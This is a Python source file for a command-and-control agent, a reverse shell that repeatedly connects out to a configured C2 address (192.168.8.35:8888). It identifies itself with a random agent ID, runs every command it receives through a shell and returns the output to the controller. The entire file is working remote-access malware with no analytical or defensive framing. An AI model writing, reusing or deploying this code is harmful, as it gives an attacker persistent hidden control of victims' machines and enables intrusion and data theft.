import socket
import subprocess
import time
import os
import uuid  # <--- NEW IMPORT

# CONFIGURATION
C2_IP = "192.168.8.35" 
C2_PORT = 8888
# Generate a unique ID for this agent once per run
AGENT_ID = str(uuid.uuid4())[:8] # Short 8-char ID

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((C2_IP, C2_PORT))
            
            # --- HANDSHAKE (NEW) ---
            # Send Identity immediately
            s.send(f"AUTH:{AGENT_ID}".encode())
            
            while True:
                command = s.recv(1024).decode()
                if not command: break 
                
                command = command.strip()
                if command == 'exit':
                    s.close()
                    return 
                
                try:
                    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                    output = proc.stdout.read() + proc.stderr.read()
                except Exception as e:
                    output = str(e).encode()

                if not output: output = b"[+] Executed"
                s.send(output)
                
        except Exception as e:
            time.sleep(5)
        finally:
            try: s.close()
            except: pass

if __name__ == "__main__":
    connect()